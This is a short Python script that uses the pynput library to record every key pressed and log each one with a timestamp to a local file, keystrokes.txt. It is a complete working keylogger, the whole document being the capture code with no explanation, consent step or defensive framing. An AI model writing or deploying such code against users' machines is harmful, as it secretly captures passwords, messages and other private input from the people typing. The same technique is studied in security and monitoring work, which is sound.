from pynput import keyboard
import logging

# Set up logging
logging.basicConfig(filename="keystrokes.txt", level=logging.DEBUG, format="%(asctime)s:%(message)s")

# Define a function to capture keystrokes
def on_press(key):
    logging.debug(key)

# Set up the hook
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()